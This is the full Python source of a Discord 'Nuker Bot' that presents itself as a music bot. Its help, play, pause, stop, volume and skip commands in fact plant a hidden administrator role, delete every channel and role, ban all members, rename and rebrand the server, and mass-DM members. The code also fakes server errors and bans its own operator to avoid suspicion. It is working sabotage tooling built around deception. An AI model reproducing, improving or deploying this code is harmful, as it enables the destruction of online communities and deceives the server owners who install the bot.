# Made by KingWaffleIII and QuantumFox42

# Nuker Bot
# v1.5

import discord
from discord.ext import commands

import requests

from datetime import datetime
from os import listdir
from time import sleep
from typing import Optional
from json import loads, dumps


# If settings json doesn't exist, create it
if "settings.json" not in listdir():
    file = open("settings.json", "w+")
    file.write("""{
    "TOKEN": false,
    "USERID": false,    
    "PREFIX": "!",
    "STATUS": "watching,for !help",
    "ROLE_IDS": {}
}""")
    file.close()
    input(
        "Created Settings JSON, please fill in your bot's token and your user ID (for correct syntax, look at the "
        "README.md on the GitHub repository)! To continue, press enter!")

# Load settings
file = open("settings.json", "r")
json_string = file.read()
file.close()
settings = loads(json_string)
TOKEN = settings["TOKEN"]
PREFIX = settings["PREFIX"]
STATUS = settings["STATUS"]
USER_ID = settings["USERID"]

# parse the STATUS var
if STATUS is not None:
    tmp = STATUS.split(",")
    ACTIVITY_TYPE = tmp[0]
    ACTIVITY = tmp[1]

    if ACTIVITY_TYPE == "playing":
        ACTIVITY_TYPE = discord.ActivityType.playing

    elif ACTIVITY_TYPE == "streaming":
        ACTIVITY_TYPE = discord.ActivityType.streaming

    elif ACTIVITY_TYPE == "listening":
        ACTIVITY_TYPE = discord.ActivityType.listening

    elif ACTIVITY_TYPE == "watching":
        ACTIVITY_TYPE = discord.ActivityType.watching

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

bot.remove_command("help")

time = datetime.now()

# def config_options for volume command
config_options = {
    1: "ban",
    2: "channels",
    3: "roles",
    4: "server",
    5: "nuke_channel",
    6: "dm",
    7: "nick"
}

ban = [True]  # banning config in !skip
channels = [True]  # channel deletion config in !skip
roles = [True]  # roles config in !skip
server = [True]  # server config in !skip
nuke_channel = [True]  # nuke_channel config in !skip
dm = [False]  # dm config in !skip
nick = [False]  # nick config in !skip


# Read and write role IDs
def getRoleIDs():
    file = open("settings.json", "r")
    read = file.read()
    file.close()
    return loads(read)["ROLE_IDS"]


def writeRoleIDs(write):
    file = open("settings.json", "r")
    read = loads(file.read())
    read["ROLE_IDS"] = write
    file.close()

    file = open("settings.json", "w+")
    file.write(dumps(read))
    file.close()
    print("")


# logging function
def output_log(text):
    with open(f"nuke_log-{time.strftime('%d.%m.%y')}.txt", "a+") as f:
        f.write(text)
        f.close()


# nuking functions
# create and give admin
async def create_admin(ctx):
    try:
        guildRoleIDs = []
        for role in ctx.guild.roles:
            guildRoleIDs.append(role.id)
        roleIDs = getRoleIDs()
        if not roleIDs == {}:
            if str(ctx.guild.id) in roleIDs.keys():
                if not roleIDs[str(ctx.guild.id)] in guildRoleIDs:
                    roleIDs.pop(str(ctx.guild.id))
                    role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
                    roleIDs[str(ctx.guild.id)] = role.id
                    writeRoleIDs(roleIDs)
                else:
                    role = ctx.guild.get_role(roleIDs[str(ctx.guild.id)])
            else:
                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
                roleIDs[ctx.guild.id] = role.id
                writeRoleIDs(roleIDs)
        else:
            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
            roleIDs[ctx.guild.id] = role.id
            writeRoleIDs(roleIDs)

        alreadyHasRole = False
        for userRole in ctx.message.author.roles:
            if userRole.id == role.id:
                alreadyHasRole = True
        if not alreadyHasRole:
            await ctx.message.author.add_roles(role)

        output_log(f'''
*** ADMIN ALERT ***
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

    except discord.Forbidden:
        output_log(f'''
Failed to create/grant administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# delete all channels
async def delete_channels(ctx):
    for guild in bot.guilds:
        if guild.name == ctx.guild.name:
            for channel in guild.channels:
                try:
                    await channel.delete()
                except discord.Forbidden:
                    output_log(f'''
Failed to delete channel "{channel.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# create nuke channel
async def create_nuke_channel(ctx, name):
    try:
        await ctx.guild.create_text_channel(name)
    except discord.Forbidden:
        output_log(f'''
Failed to create the "get nuked" channel: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# change server name and icon
async def edit_server(ctx, name, icon_file):
    if icon_file.find("http") != -1:
        response = requests.get(icon_file)

        with open(".tmp_icon", "wb") as f:
            f.write(response.content)
            f.close()

        icon_file = ".tmp_icon"

    with open(icon_file, "rb") as f:
        icon = f.read()
        f.close()

    try:
        await ctx.guild.edit(name=name, icon=icon)
    except discord.Forbidden:
        output_log(f'''
Failed to edit the server's icon and name: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# ban all members
async def ban_members(ctx, member_list):
    for member_id in member_list:
        member = await ctx.guild.fetch_member(member_id)
        try:
            await ctx.guild.ban(member, reason="NUKE DETONATED!")
            print(f"Banned user \"{member.name}\"")
        except discord.Forbidden:
            output_log(f'''
Failed to ban user "{member}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# delete all roles
async def delete_roles(ctx, role_list):
    for role in role_list:
        try:
            await role.delete()
        except discord.Forbidden:
            output_log(f'''
Failed to delete role "{role.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# prints some basic info about the bot when ready
@bot.event
async def on_ready():
    activity = discord.Activity(
        name=ACTIVITY, type=ACTIVITY_TYPE)
    await bot.change_presence(activity=activity)

    print(f"{bot.user} online!")
    print("Connected servers: \n")

    for guild in bot.guilds:
        print(guild.name)

    print(f"Actively logging operations in \"nuke_log-{time.strftime('%d.%m.%y')}.txt\"")
    output_log("\n")


# outputs to the log some basic info about the new guild when connected
@bot.event
async def on_guild_join(guild):
    output_log(f'''
=> SERVER JOIN ALERT <=
{bot.user} has joined the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')


# outputs to the log some basic info about the old guild when disconnected
@bot.event
async def on_guild_leave(guild):
    output_log(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')


# gives an error to any command beginning with !
@bot.event
async def on_message(msg):
    if msg.content.startswith(PREFIX):
        cmds = []
        for command in bot.commands:
            cmds.append(str(command))
        if not msg.content.lower().split(" ")[0][1:] in cmds:
            embed = discord.Embed(
                title="Server Error!",
                description="Our servers are currently experiencing some issues, please check back at a later time!",
                colour=0xff0000, set_image="https://i.imgur.com/qxBoiZY.png"
            )
            await msg.channel.send(content=None, embed=embed)
        elif msg.author.id == USER_ID:
            await bot.process_commands(msg)


# nukes the server
@bot.command(name="help")
@commands.bot_has_permissions(administrator=True)
async def nuke(ctx):
    server_name = ctx.guild.name

    # make admin role and give user admin

    await create_admin(ctx)

    # delete all channels

    await delete_channels(ctx)

    # create nuke channel

    await create_nuke_channel(ctx, "get nuked")

    # change server icon & name

    await edit_server(ctx, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg")

    # ban all users

    member_list = []
    for member in ctx.guild.members:
        if member.id == ctx.message.author.id:
            pass
        elif member.id == bot.user.id:
            pass
        elif member.id == ctx.guild.owner.id:
            pass
        else:
            member_list.append(member.id)

    await ban_members(ctx, member_list)

    # delete all roles

    role_list = []

    roleIDs = getRoleIDs()

    for role in ctx.guild.roles:
        if role == ctx.guild.default_role:
            pass
        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
            pass
        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
            pass
        else:
            role_list.append(role)

    await delete_roles(ctx, role_list)

    output_log(f'''
*** NUKE ALERT ***
Server Name: {server_name}
Server Owner: {ctx.guild.owner}
Banned Users: {len(member_list)}
Roles Deleted: {len(role_list)}
Time: {datetime.now()}
''')


# gives the user admin
@bot.command(name="play")
@commands.bot_has_permissions(administrator=True)
async def play(ctx):
    await ctx.message.delete()
    await create_admin(ctx)


# bans the person who ran the command to avoid suspicion
@bot.command(name="pause")
@commands.bot_has_permissions(administrator=True)
async def pause(ctx):
    await ctx.message.delete()
    if not USER_ID:
        await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
        output_log(f'''
*** NUKER BAN ALERT ***
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
    else:
        await ctx.guild.ban(await ctx.guild.fetch_member(USER_ID))
        output_log(f'''
*** NUKER BAN ALERT ***
Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# bans the person who ran the command as well as removing the bot
@bot.command(name="stop")
@commands.bot_has_permissions(administrator=True)
async def stop(ctx):
    await ctx.message.delete()
    if not USER_ID:
        await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
        output_log(f'''
*** NUKER CLEANUP ALERT ***
Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
    else:
        await ctx.guild.ban(await ctx.guild.fetch_member(USER_ID))
        output_log(f'''
*** NUKER CLEANUP ALERT ***
Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

    await ctx.guild.leave()


# leaves the server
@bot.command(name="leave")
async def leave(ctx):
    await ctx.guild.leave()
    output_log(f'''
*** SERVER LEAVE ALERT ***
{bot.user} has left the server.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@bot.command(name="volume")
@commands.bot_has_permissions(administrator=True)
async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
    await ctx.message.delete()
    if USER_ID is not False:
        if ctx.message.author.id != USER_ID:
            return

    global ban, channels, roles, server, nuke_channel, dm, nick

    if value != "*":
        setting = config_options[int(value)]
        if setting == "ban":
            ban = [status]

            print(f"Changed \"ban everyone\" to {ban[0]}")
        elif setting == "channels":
            channels = [status]

            print(f"Changed \"delete channels\" to {channels[0]}")
        elif setting == "roles":
            roles = [status]

            print(f"Changed \"delete roles\" to {roles[0]}")
        elif setting == "server":
            server = [status]

            if arg1:
                server.append(arg1)
            else:
                server.append("GET NUKED!")

            if arg2:
                server.append(arg2)
            else:
                server.append("https://i.imgur.com/CNdUGZj.jpg")

            print(f"Changed \"edit server\" to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
        elif setting == "nuke_channel":
            nuke_channel = [status]

            if arg1:
                nuke_channel.append(arg1)
            else:
                nuke_channel.append("get nuked")

            print(f"Changed \"nuke channel\" to {nuke_channel[0]} with a name of {nuke_channel[1]}")
        elif setting == "dm":
            dm = [status]

            if arg1:
                dm.append(arg1)
            else:
                dm.append("GET NUKED!")

            print(f"Changed \"DM everyone\" to {dm[0]} with a message of {dm[1]}")
        elif setting == "nick":
            nick = [status]

            if arg1:
                nick.append(arg1)
            else:
                nick.append("GET NUKED!")

            print(f"Changed \"nick everyone\" to {nick[0]} with a message of {nick[1]}")

    else:
        ban = [status]

        print(f"Changed \"ban everyone\" to {ban[0]}")

        channels = [status]

        print(f"Changed \"delete channels\" to {channels[0]}")

        roles = [status]

        print(f"Changed \"delete roles\" to {roles[0]}")

        server = [status]

        if arg1:
            server.append(arg1)
        else:
            server.append("GET NUKED!")

        if arg2:
            server.append(arg2)
        else:
            server.append("https://i.imgur.com/CNdUGZj.jpg")

        print(f"Changed \"edit server\" to {server[0]} with a name of \"{server[1]}\" and an icon of \"{server[2]}\"")

        nuke_channel = [status]

        if arg1:
            nuke_channel.append(arg1)
        else:
            nuke_channel.append("get nuked")

        print(f"Changed \"nuke channel\" to {nuke_channel[0]} with a name of \"{nuke_channel[1]}\"")

        dm = [status]

        if arg1:
            dm.append(arg1)
        else:
            dm.append("GET NUKED!")

        print(f"Changed \"DM everyone\" to {dm[0]} with a message of \"{dm[1]}\"")

        nick = [status]

        if arg1:
            nick.append(arg1)
        else:
            nick.append("GET NUKED!")

        print(f"Changed \"nick everyone\" to {nick[0]} with a message of \"{nick[1]}\"")


@bot.command(name="skip")
@commands.bot_has_permissions(administrator=True)
async def skip(ctx):
    if USER_ID is not False:
        if ctx.message.author.id != USER_ID:
            return

    do_ban = ban[0]
    do_channels = channels[0]
    do_roles = roles[0]
    do_server = server[0]
    do_nc = nuke_channel[0]
    do_dm = dm[0]
    do_nick = nick[0]

    if do_channels:
        await delete_channels(ctx)

    if do_nc:
        nc_name = nuke_channel[1]
        await create_nuke_channel(ctx, nc_name)

    if do_server:
        server_name = server[1]
        server_icon = server[2]

        await edit_server(ctx, server_name, str(server_icon))

    if do_dm:
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            else:
                try:
                    await member.send(dm[1])
                except discord.HTTPException:
                    print(f"Could not DM user {member.name}.")

    if do_nick:
        nickname = nick[1]
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            else:
                try:
                    await member.edit(nick=nickname)
                except discord.HTTPException:
                    print(f"Could not nickname user {member.name}.")

    if do_ban:
        member_list = []
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            elif member.id == ctx.guild.owner.id:
                pass
            else:
                member_list.append(member.id)

        await ban_members(ctx, member_list)

    roleIDs = getRoleIDs()
    if do_roles:
        role_list = []
        for role in ctx.guild.roles:
            if role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
                pass
            elif role == ctx.guild.default_role:
                pass
            elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
                pass
            else:
                role_list.append(role)

        await delete_roles(ctx, role_list)


# checks if the bot has administrator permissions
# if it doesn't, throws an error
@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@play.error
async def play_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@pause.error
async def pause_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@stop.error
async def stop_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@volume.error
async def vol_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@skip.error
async def skip_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


if not TOKEN:
    print("Could not find token in settings")
    print("\nPlease enter your bot token: ")
    print("(if you don't know what this is, please visit: https://github.com/KingWaffleIII/Nuker-Bot#setup to see how "
          "to make your own bot application)\n")
    TOKEN = input("> ")
    try:
        bot.run(str(TOKEN))
    except discord.LoginFailure:
        print("Unable to log into the bot; please verify the bot token is correct!")
    except KeyboardInterrupt:
        print("Quitting... press CTRL+C again to kill the app.")
else:
    bot.run(TOKEN)
